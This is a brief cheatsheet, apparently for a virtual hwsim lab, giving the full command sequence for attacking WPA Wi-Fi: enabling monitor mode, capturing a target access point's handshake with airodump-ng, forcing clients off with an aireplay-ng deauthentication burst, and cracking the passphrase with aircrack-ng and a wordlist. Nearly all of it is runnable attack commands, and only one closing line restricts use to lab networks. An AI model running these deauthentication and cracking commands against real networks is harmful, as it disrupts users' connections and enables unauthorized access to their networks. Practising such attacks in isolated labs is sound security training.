# Cheatsheet — live WPA capture

## Monitor mode

```bash
sudo airmon-ng start wlan1          # may rename → wlan1mon
# or manual:
sudo ip link set wlan1 down
sudo iw wlan1 set type monitor
sudo ip link set wlan1 up
iw dev                              # verify mode
```

## Capture

```bash
sudo airodump-ng wlan1mon                      # survey all
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
     -w capture wlan1mon                       # lock channel+target
# Top: APs. Bottom: connected STATIONs (client MACs).
# "WPA handshake: ..." top-right = success
```

## Deauth

```bash
sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan1mon
# -0 = deauth, 5 = burst count
```

## Then crack

```bash
aircrack-ng -w wordlist capture-01.cap
```

## hwsim lab notes

- `iw phy` → phy0/phy1/phy2 radios; `iw dev` → wlan0/wlan1/wlan2.
- This VM's radios are kernel-local — attack lab networks only.
- Clean reset if stuck: `sudo iw dev wlan1mon del && sudo iw phy phy1 interface add wlan1 type managed`.
